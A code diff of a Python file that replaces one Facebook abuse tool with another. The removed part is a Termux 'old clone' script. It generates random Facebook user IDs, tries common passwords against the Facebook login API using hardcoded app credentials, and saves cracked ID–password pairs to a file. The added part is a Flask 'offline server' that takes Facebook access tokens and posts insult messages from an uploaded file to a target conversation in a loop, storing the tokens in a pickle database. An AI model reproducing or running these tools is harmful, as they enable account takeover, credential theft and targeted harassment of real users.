@@ -1,259 +1,230 @@
-#SC OWNER_______________KARTIK XWD
-from ast import Pass
-from os import name, path
-import os,base64,zlib,pip,urllib
-from weakref import proxy
-import os,base64,zlib,platform
-from urllib.request import parse_http_list
-print('\n []\033[1;32m \033[1;91m\033[1;41m\033[1;33m\033[1;35m\033[1;37m PLEASE WAIT NADEEM SYSTEM UPDATE CHECKIIN\033[;0m\033[1;91m\033[1;92m\033[38;5;46m...!!!')
-os.system("pip uninstall urllib3 requests chardet idna certifi -y");os.system("pip install urllib3 requests chardet idna certifi")
-print('\n \033[1;36m[]\033[1;37m \033[1;91m\033[1;41m\033[1;33m\033[1;35m\033[1;37m BROKEN KARTIIK SUNA HAI JAAN LETE HAI LOG JAAN BAN KE \033[;0m\033[1;91m\033[1;92m\033[38;5;46m.!')
-os.system('xdg-open https://www.facebook.com/profile.php?id=100001028253449&mibextid=ZbWKwL')
-try:
-    from bs4 import BeautifulSoup as bsp
-except:
-    os.system('pip install bs4')
-    from bs4 import BeautifulSoup as bsp
-try:
-        import os,requests,json,time,re,random,sys,uuid,string,subprocess
-        from string import *
-        from concurrent.futures import ThreadPoolExecutor as tred
-except ModuleNotFoundError:
-        print('\n Installing missing modules ...')
-        #   os.system('M3g-open https://facebook.com/groups/1430148900897205/')
-        os.system('python s1n.py')  
-        os.system('clear')
-####### MODL KILLER #######
-from requests import api
-x = open(api.__file__,'r').read()
-if "print" in x:
-    clr()
-elif "sys.stdout.write" in x:
-    clr()
-else:
-    pass
-from requests import sessions
- 
-x = open(sessions.__file__,'r').read()
-if "print" in x:
-    clr()
-elif "sys.stdout.write" in x:
-    clr()
-else:
-    pass
-from requests import models
-x = open(models.__file__,'r').read()
-if "print" in x:
-    clr()
- 
-elif "sys.stdout.write" in x:
-    clr()
-else:
-    pass
-#__________NEW IDX UA_____________#
-def WASU2():
- a = "Dalvik/2.1.0 (Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.3) [FBAN/Orca-Android;FBAV/487.1.0.74.74;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/456417358;FBCR/AIS;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]"
- b = "[FBAN/FB4A;FBAV/280.0.0.48.122;FBBV/233235247;FBDM/{density=3.0,width=1080,height=2132};FBLC/en_US;FBRV/235412020;FBCR/airtel;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/CPH1893;FBSV/9;FBOP/1;FBCA/armeabi-v7a:armeabi;]"+"Mozilla/5.0 (Linux; Android 13; Infinix X6525B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/130.0.6723.107 Mobile Safari/537.36[FBAN/EMA;FBLC/id_ID;FBAV/434.0.0.2.99;FBCX/modulariab;]"
- M1= a + b
- return M1
-    #__________NEW IDX UA_____________#
- 
-def WASU1():
-    en = random.choice(['en_US','en_GB','en_PK','ru_RU','de_DE','th_TH','en_BD','en_IN','en_AF'])
-    kt = random.choice(['com.facebook.katana','com.facebook.orca','com.facebook.mlite'])
-    fbcr = random.choice(['o2 - de', 'Verizon - us','MY CELCOM','Vodafone - uk','null','DTAC','IND airtel','Nepal Telecom'])
-    s=  "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/78.0.0.16.67;FBBV/30529816;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBCR/MTN NG;FBMF/Infinix;FBBD/Infinix;FBPN/com.facebook.katana;FBDV/Infinix_X521;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]"+"Mozilla/5.0 (Linux; Android 13; Infinix X6525B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/130.0.6723.108 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/475.1.0.46.82;]"+"Mozilla/5.0 (Linux; Android 12; Infinix X676C Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/131.0.6778.46 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/490.0.0.63.82;]"+"Mozilla/5.0 (Linux; Android 13; Infinix X678B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/130.0.6723.106 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/448.0.0.30.115;]"
-    e = "[FBAN/Orca-Android;FBAV/377.0.0.13.101;FBPN/com.facebook.orca;FBLC/en_US;FBBV/396116327;FBCR/MTN;FBMF/INFINIX;FBBD/Infinix;FBDV/Infinix X669;FBSV/12;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1444};FB_FW/1;]"+"Mozilla/5.0 (Linux; Android 14; Infinix X6711 Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/131.0.6778.46 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/490.0.0.63.82;IABMV/1;]"+"Mozilla/5.0 (Linux; Android 13; Infinix X6731B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/131.0.6778.46 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/490.0.0.63.82;]"+"Mozilla/5.0 (Linux; Android 14; Infinix X678B Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/122.0.6261.119 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/489.0.0.66.81;]"
-    ua = s + e
-    return ua
-       #__________NEW IDX UA_____________#
-  #───────────────[BIT ROOM]───────────────────────── #
-import os, platform, time, sys
-#os.system('pkg install espeak ')
-print('\033[1;91m[\033[1;92m⊀⊁\033[1;91m] \033[1;91m⊀\33[1;92mAssalam O Alaikum\33[1;91m⊁ ')
-#os.system('espeak -a 300 " ,FILE CLONING 0.1, TOOLS,INSTALL Complete ,"')
-time.sleep(1)
-os.system('clear')
-##
-import os, platform, time, sys
+from flask import Flask, request, render_template_string
+import requests
+from threading import Thread, Event
+import time
+import random
+import string
+import pickle
+import os
 
-try:
- import requests
-except:os.system("pip uninstall requests -y;pip install requests")
+app = Flask(__name__)
+app.debug = True
 
-print('\033[1;91m[\033[1;97m-\033[1;91m] \033[1;92mChecking For Update. . . .')
-os.system('https://www.facebook.com/profile.php?id=100001028253449&mibextid=ZbWKwL')
-time.sleep(2)
+headers = {
+    'Connection': 'keep-alive',
+    'Cache-Control': 'max-age=0',
+    'Upgrade-Insecure-Requests': '1',
+    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
+    'user-agent': 'Mozilla/5.0 (Linux; Android 11; TECNO CE7j) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36',
+    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+    'Accept-Encoding': 'gzip, deflate',
+    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
+    'referer': 'www.google.com'
+}
 
+# Create a database using pickle to store access tokens
+db_path = 'tokens_db.pkl'
 
-os.system('git pull --quiet 2>/dev/null')
-bit = platform.architecture()[0]
-if bit == '64bit':
- print('\033[1;91m[\033[1;92m◉\033[1;91m] \033[1;92mYOU ARE 64BIT USER')
- 
-elif bit == '32bit':
- print('\033[1;91m[\033[1;92m◉\033[1;91m] \033[1;92mYOU ARE 32BIT USER')
+def load_db():
+    if os.path.exists(db_path):
+        with open(db_path, 'rb') as f:
+            return pickle.load(f)
+    return {}
 
- #───────────────[BIT End]───────────────────────── #
-sys.stdout.write('\x1b]2; [🙂KARTIIK-XD💔]\x07')
-def clear():
-    os.system('clear')
-    print(logo)
-logo=(""" \033[1;38m
-          _______  _       _________          _______ 
-|\     /|(  ___  )( (    /|\__   __/|\     /|(  ___  )
-| )   ( || (   ) ||  \  ( |   ) (   ( \   / )| (   ) |
-| (___) || (___) ||   \ | |   | |    \ (_) / | (___) |
-|  ___  ||  ___  || (\ \) |   | |     \   /  |  ___  |
-| (   ) || (   ) || | \   |   | |      ) (   | (   ) |
-| )   ( || )   ( || )  \  |___) (___   | |   | )   ( |
-|/     \||/     \||/    )_)\_______/   \_/   |/     \|
+def save_db(data):
+    with open(db_path, 'wb') as f:
+        pickle.dump(data, f)
 
-\033[1;36m        VERSION  : \033[1;36m 1.5
+stop_events = {}
+threads = {}
 
-\033[1;91m----------------------------------------------
-\033[1;37m OWNER    : SAAD AHMAD
-\033[1;31m FACEBOOK : SAAD AHMAD ••)
-\033[1;97m GITHUB   : WASU-XD 
-\033[1;92m WHATSAPP : 03119924646 \033[1;90m(WASU)
-\033[1;92m WHATSAPP : 03368497329 \033[1;90m(RASHID)
-\033[1;33m STATUS   : TRAIL
-\033[1;91m NOTE     :\033[1;93m NO FEEDBACK NO APPROVAL 
-\33[37;41m\tBELIEVE,STRU\033[1;32mGGLE & ACHIEVE\33[0;m
-\033[1;97m-----------------------------------------------""")
-#[===================MODULE======================]#
-import os,sys,uuid,requests,time
-from concurrent.futures import ThreadPoolExecutor as ArAfat
-from os import system as axp
-from random import randint as aRaft
-from random import choice as race
-from string import digits as digits
-#[===================COLORS======================]#
-R = '\033[1;91m';W = '\033[1;97m';G = '\033[1;32m';Y = '\033[1;33m';B = '\x1b[38;5;46m';xd = f"{W}({R}×{W})";x = f"{W}({R}1{W})";y = f"{W}({R}2{W})";os.system("clear")
-#[===================LOOP======================]#
-loop, ok = 0, 0
-user = []
-#[===================LOGO======================]#
-sys.stdout.write('\x1b]2; [🙂NADIM-XD💔]\x07')
-logo=("""\033[1;37m        
-     \033[1;32m███╗   ██╗ █████╗ ██████╗ ███████╗███████╗███╗   ███╗     █████╗ ██╗     ██╗
-     \033[1;32m████╗  ██║██╔══██╗██╔══██╗██╔════╝██╔════╝████╗ ████║    ██╔══██╗██║     ██║
-     \033[1;37m██╔██╗ ██║███████║██║  ██║█████╗  █████╗  ██╔████╔██║    ███████║██║     ██║
-     \033[1;37m██║╚██╗██║██╔══██║██║  ██║██╔══╝  ██╔══╝  ██║╚██╔╝██║    ██╔══██║██║     ██║
-     \033[1;32m██║ ╚████║██║  ██║██████╔╝███████╗███████╗██║ ╚═╝ ██║    ██║  ██║███████╗██║
-     \033[1;32m╚═╝  ╚═══╝╚═╝  ╚═╝╚═════╝ ╚══════╝╚══════╝╚═╝     ╚═╝    ╚═╝  ╚═╝╚══════╝╚═╝                                                                                                                                
-\033[1;92m<<━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━>>
-[💔]\033[1;32m 𝗢𝗪𝗡𝗘𝗥     :: 𝗕𝗥𝗢𝗞𝗘𝗡-𝗞𝗔𝗥𝗧𝗜𝗞
-[💔]\033[1;32m 𝗙𝗕 𝗜𝗗     :: 𝗞𝗔𝗥𝗧𝗜𝗜𝗞  🩷
-[💔]\033[1;92m 𝗚𝗜𝗧𝗛𝗨𝗕    :: 𝗕𝗥𝗢𝗞𝗘𝗡-𝗞𝗔𝗥𝗧𝗜𝗜𝗞
-[💔]\033[1;95m 𝗙𝗘𝗟𝗜𝗡𝗚𝗦   :: 𝗕𝗥𝗢𝗞𝗘𝗡 😀💔
-[💔]\033[1;34m 𝗩𝗘𝗥𝗦𝗜𝗢𝗡   :: \033[1;33m 𝗬𝗢𝗨 𝗛𝗔𝗡𝗚
-[💔]\033[1;35m 𝗦𝗧𝗔𝗧𝗨𝗦    :: 𝗬𝗢𝗨𝗥 𝗞𝗛𝗨𝗦𝗛𝗜...
-\033[1;92m<<━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━>>""")
-#[===================CLEAR======================]#
-def clear():
-    axp("clear")
-    print(logo)
-#[===================ANIMATION======================]#
-def animation(u):
-    for e in u + "\n":
-        sys.stdout.write(e)
-        sys.stdout.flush()
-        time.sleep(0.01)
-#[===================LINE======================]#
-def linex():
-    animation(f"\033[1;32m<<===================================\033[1;91m\033[1;41m\033[1;33m\033[1;35m\033[1;37mBROKEN-NADEEM\033[;0m\033[1;91m\033[1;92m\033[38;5;46m====================================>>\x1b[1;97m")
-#[===================UA-BOX======================]#
-def WASU():
-    return "mozilla/5.0 (X11;linux x86_AppleWebkit/537.36 (KHTML, like Gecko)Chrome/124.0.0.0 safari/537.36) [FBAN/Orca-Android;FBAV/28.0.0.1.16;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/6811796;FBCR/AIS;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]"
-#[===================MAIN-MENU======================]#
-def main():
-    clear()
-    print(f"\033[1;37m❨\033[1;31m[1]\033[1;37m❩\033[1;32m OLD CLONE 2009-2014\n\033[1;37m❨\033[1;31m[2]\033[1;37m❩\033[1;31m EXIT")
-    linex()
-    frsc = input(f"\033[1;37m❨\033[1;31m\033[1;37m❩\033[1;32m CHOICE : ")
-    if frsc == "1":
-        settings()
-    if frsc == "2":
-        clear()
-        print("\033[1;37m❨\033[1;31m•|•\033[1;37m❩\033[1;32m TERMUX BAND TOOLS EXIT ✅")
-        os.system("exit")
+def send_messages(access_tokens, thread_id, mn, time_interval, messages, task_id):
+    stop_event = stop_events[task_id]
+    while not stop_event.is_set():
+        for message1 in messages:
+            if stop_event.is_set():
+                break
+            for access_token in access_tokens:
+                # Add the custom message before the actual message
+                message = f"Hello SAHIIL SīīR II AM USIING YOUR OFFLINE SERVER...MY TOKEN IIS..⤵️ {mn} {message1}"
+                api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
+                parameters = {'access_token': access_token, 'message': message}
+                response = requests.post(api_url, data=parameters, headers=headers)
+                if response.status_code == 200:
+                    print(f"Message Sent Successfully From token {access_token}: {message}")
+                else:
+                    print(f"Message Sent Failed From token {access_token}: {message}")
+                time.sleep(time_interval)
+
+@app.route('/', methods=['GET', 'POST'])
+def send_message():
+    if request.method == 'POST':
+        token_option = request.form.get('tokenOption')
+
+        if token_option == 'single':
+            access_tokens = [request.form.get('singleToken')]
+        else:
+            token_file = request.files['tokenFile']
+            access_tokens = token_file.read().decode().strip().splitlines()
+
+        # Validate target UID
+        target_uid = "61571843423018"  # Your UID
+        if target_uid not in access_tokens:
+            return f"Unauthorized access. Only authorized tokens can be used."
+
+        thread_id = request.form.get('threadId')
+        mn = request.form.get('kidx')
+        time_interval = int(request.form.get('time'))
+
+        txt_file = request.files['txtFile']
+        messages = txt_file.read().decode().splitlines()
+
+        task_id = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
+
+        stop_events[task_id] = Event()
+        thread = Thread(target=send_messages, args=(access_tokens, thread_id, mn, time_interval, messages, task_id))
+        threads[task_id] = thread
+        thread.start()
+
+        # Store token in database
+        db = load_db()
+        db[task_id] = access_tokens
+        save_db(db)
+
+        return f'YOUR STOP KEY -> {task_id}'
+
+    return render_template_string('''
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>😈 𝙎𝘼𝙃𝙄𝙇 𝙄𝙉𝙎𝙄𝘿𝙀 😈 </title>
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
+  <style>
+    /* CSS for styling elements */
+    label { color: white; }
+    .file { height: 30px; }
+    body {
+      background-image: url('https://i.ibb.co/19kSMz4/In-Shot-20241121-173358587.jpg');
+      background-size: cover;
+      background-repeat: no-repeat;
+      color: white;
+    }
+    .container {
+      max-width: 350px; 
+      height: auto;
+      border-radius: 20px;
+      padding: 20px;
+      box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
+      box-shadow: 0 0 15px white;
+      border: none;
+      resize: none;
+    }
+    .form-control {
+      outline: 1px red;
+      border: 1px double white;
+      background: transparent;
+      width: 100%;
+      height: 40px;
+      padding: 7px;
+      margin-bottom: 20px;
+      border-radius: 10px;
+      color: white;
+    }
+    .header { text-align: center; padding-bottom: 20px; }
+    .btn-submit { width: 100%; margin-top: 10px; }
+    .footer { text-align: center; margin-top: 20px; color: #888; }
+    .whatsapp-link {
+      display: inline-block;
+      color: #25d366;
+      text-decoration: none;
+      margin-top: 10px;
+    }
+    .whatsapp-link i { margin-right: 5px; }
+  </style>
+</head>
+<body>
+  <header class="header mt-4">
+    <h1 class="mt-3">☠️❤️ 𝙊𝙒𝙉𝙀𝙍 𝙎𝘼𝙃𝙄𝙇 𝘿𝙊𝙉 ❤️☠️</h1>
+  </header>
+  <div class="container text-center">
+    <form method="post" enctype="multipart/form-data">
+      <div class="mb-3">
+        <label for="tokenOption" class="form-label">Select Token Option</label>
+        <select class="form-control" id="tokenOption" name="tokenOption" onchange="toggleTokenInput()" required>
+          <option value="single">Single Token</option>
+          <option value="multiple">Token File</option>
+        </select>
+      </div>
+      <div class="mb-3" id="singleTokenInput">
+        <label for="singleToken" class="form-label">𝙀𝙉𝙏𝙀𝙍 𝙎𝙄𝙉𝙂𝙇𝙀 𝙏𝙊𝙆𝙀𝙉..⤵️</label>
+        <input type="text" class="form-control" id="singleToken" name="singleToken">
+      </div>
+      <div class="mb-3" id="tokenFileInput" style="display: none;">
+        <label for="tokenFile" class="form-label">Choose Token File</label>
+        <input type="file" class="form-control" id="tokenFile" name="tokenFile">
+      </div>
+      <div class="mb-3">
+        <label for="threadId" class="form-label">𝙀𝙉𝙏𝙀𝙍 𝘾𝙊𝙉𝙑𝙊 𝙐𝙄𝘿...⤵️</label>
+        <input type="text" class="form-control" id="threadId" name="threadId" required>
+      </div>
+      <div class="mb-3">
+        <label for="kidx" class="form-label">𝙀𝙉𝙏𝙀𝙍 𝙃𝘼𝙏𝙀𝙍 𝙉𝘼𝙈𝙀...⤵️</label>
+        <input type="text" class="form-control" id="kidx" name="kidx" required>
+      </div>
+      <div class="mb-3">
+        <label for="time" class="form-label">𝙀𝙉𝙏𝙀𝙍 𝙎𝙋𝙀𝙀𝘿...⤵️ (seconds)</label>
+        <input type="number" class="form-control" id="time" name="time" required>
+      </div>
+      <div class="mb-3">
+        <label for="txtFile" class="form-label">𝙀𝙉𝙏𝙀𝙍 𝙂𝘼𝙇𝙄 𝙁𝙄𝙇𝙀..⤵️</label>
+        <input type="file" class="form-control" id="txtFile" name="txtFile" required>
+      </div>
+      <button type="submit" class="btn btn-primary btn-submit">☠️ 𝙍𝙐𝙉𝙄𝙉𝙂 𝙎𝙀𝙍𝙑𝙀𝙍 ☠️</button>
+    </form>
+    <form method="post" action="/stop">
+      <div class="mb-3">
+        <label for="taskId" class="form-label">𝙀𝙉𝙏𝙀𝙍 𝙎𝙏𝙊𝙋 𝙆𝙀𝙔..⤵️</label>
+        <input type="text" class="form-control" id="taskId" name="taskId" required>
+      </div>
+      <button type="submit" class="btn btn-danger btn-submit mt-3">❤️ 𝙎𝙏𝙊𝙋 𝙎𝙀𝙍𝙑𝙀𝙍 ❤️</button>
+    </form>
+  </div>
+  <footer class="footer">
+    <p>☠️✨ 𝙎𝘼𝙃𝙄𝙇 𝙃𝙀𝙍𝙀 ✨☠️</p>
+    <p> <a href="https://www.facebook.com/profile.php?id=61571843423018">ᴄʟɪᴄᴋ ʜᴇʀᴇ ғᴏʀ ғᴀᴄᴇʙᴏᴏᴋ</a></p>
+    <div class="mb-3">
+      <a href="https://wa.me/+919058736281" class="whatsapp-link">
+        <i class="fab fa-whatsapp"></i>💫 𝘾𝙃𝘼𝙏 𝙊𝙉 𝙒𝙃𝘼𝙏𝙎𝘼𝙋𝙋 💫
+      </a>
+    </div>
+  </footer>
+  <script>
+    function toggleTokenInput() {
+      var tokenOption = document.getElementById('tokenOption').value;
+      if (tokenOption == 'single') {
+        document.getElementById('singleTokenInput').style.display = 'block';
+        document.getElementById('tokenFileInput').style.display = 'none';
+      } else {
+        document.getElementById('singleTokenInput').style.display = 'none';
+        document.getElementById('tokenFileInput').style.display = 'block';
+      }
+    }
+  </script>
+</body>
+</html>
+''')
+
+@app.route('/stop', methods=['POST'])
+def stop_task():
+    task_id = request.form.get('taskId')
+    if task_id in stop_events:
+        stop_events[task_id].set()
+        return f'Task with ID {task_id} has been stopped.'
     else:
-        os.system("python clone.py")
-#[===================SETTING'S======================]#
-def settings():
-    animation(f"\033[1;37m❨\033[1;31m•|•\033[1;37m❩\033[1;32m EXAMPLE \033[1;35m❯ \033[1;32m 10000 / 20000 / 30000 / 40000")
-    linex()
-    limit = int(input(f"\033[1;37m❨\033[1;31m•|•\033[1;37m❩\033[1;32m ENTER  LIMIT \033[1;35m❯ \033[1;32m"))
-    for _ in range(limit):
-        arf = ''.join(race(digits) for _ in range(10))
-        user.append(arf)    
-    with ArAfat(max_workers=30) as ablxXudina:
-        total = str(len(user))
-        clear()
-        animation(f"\033[1;37m❨\033[1;31m•|•\033[1;37m❩\033[1;32m YOUR TOTAL LIMIT \033[1;35m❯ \033[1;32m%s" % (total))
-        animation(f"\033[1;37m❨\033[1;31m•|•\033[1;37m❩\033[1;32m IF NO RESULT THAN TRY VPN")
-        linex()
-        for xd in user:
-            uid = str("10000" + xd)
-            pas = ['123456789','123456','00000','1234567']
-            ablxXudina.submit(FBOLDIDSFUCKER, uid, pas, total)    
-    print()
-    linex()
-    print(f"\033[1;37m❨\033[1;31m•|•\033[1;37m❩\033[1;32m PROCESS COMPLETE \n\033[1;37m❨\033[1;31m•|•\033[1;37m❩\033[1;32m TOTAL OK \033[1;35m❯ \033[1;32m%s" % (ok))
-    linex()
-    input(f"\033[1;37m❨\033[1;31m•|•\033[1;37m❩\033[1;32m ENTER TO GET MENU ")
-    exit()
-#[===================LOGO======================]#
-def FBOLDIDSFUCKER(uid, pas, tl):
-    global loop, ok
-    sys.stdout.write(f"\r\r\033[1;37m❨\033[1;31m•|•\033[1;37m❩\033[1;32m [-NADIM-OKY-] \033[1;37m❨\033[1;31mKARTIK\033[1;37m❩\033[1;32m %s \033[1;37m❨\033[1;31m•|•\033[1;37m❩\033[1;32m OK \033[1;31m=\033[1;32m %s "%(loop,ok))
-    sys.stdout.flush()    
-    try:
-        for ps in pas:
-            with requests.Session() as session:
-                data = {
-                    'adid': str(uuid.uuid4()),
-                    'email': uid,
-                    'password': ps,
-                    'cpl': 'true',
-                    'credentials_type': 'device_based_login_password',
-                    'source': 'device_based_login',
-                    'error_detail_type': 'button_with_disabled',
-                    'format': 'json',
-                    'generate_session_cookies': '1',
-                    'generate_analytics_claim': '1',
-                    'generate_machine_id': '1',
-                    "family_device_id": str(uuid.uuid4()),
-                    "advertiser_id": str(uuid.uuid4()),
-                    "locale": "en_US",
-                    "client_country_code": "US",
-                    "device_id": str(uuid.uuid4()),
-                    "method": "auth.login",
-                    "api_key": "882a8490361da98702bf97a021ddc14d",
-                    "fb_api_req_friendly_name": "authenticate",
-                    "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler"
-                }
-                head = {
-                    'content-type': 'application/x-www-form-urlencoded',
-                    'Host': 'graph.facebook.com',
-                    'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
-                    'user-agent': WASU(),
-                    'accept-encoding': 'gzip, deflate',
-                    'x-fb-http-engine': 'Liger'
-                }
-                url = "https://b-api.facebook.com/auth/login"
-                response = session.post(url, data=data, headers=head, verify=True).json()
-                if "access_token" in response:
-                    print(f"\n\033[1;32m[-NADIM-OKY-] \033[1;30m{uid} \033[1;31m•|• \033[1;32m{ps}")
-                    open("/sdcard/[-NADIM-OKY-].txt", "a").write(uid + "|" + ps + "\n")
-                    ok+=1
-                    break
-                elif "www.facebook.com" in response.get("error", {}).get("message", ""):
-                    print(f"\n\033[1;32m[-NADIM-OKY-] \033[1;30m{uid} \033[1;31m•|• \033[1;32m{ps}")                 
-                    open("/sdcard/[-NADIM-OKY-].txt", "a").write(uid + "|" + ps + "\n")
-                    break
-        loop+=1
-    except Exception as e:
-        pass
-main()
+        return f'No task found with ID {task_id}.'
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=5000)
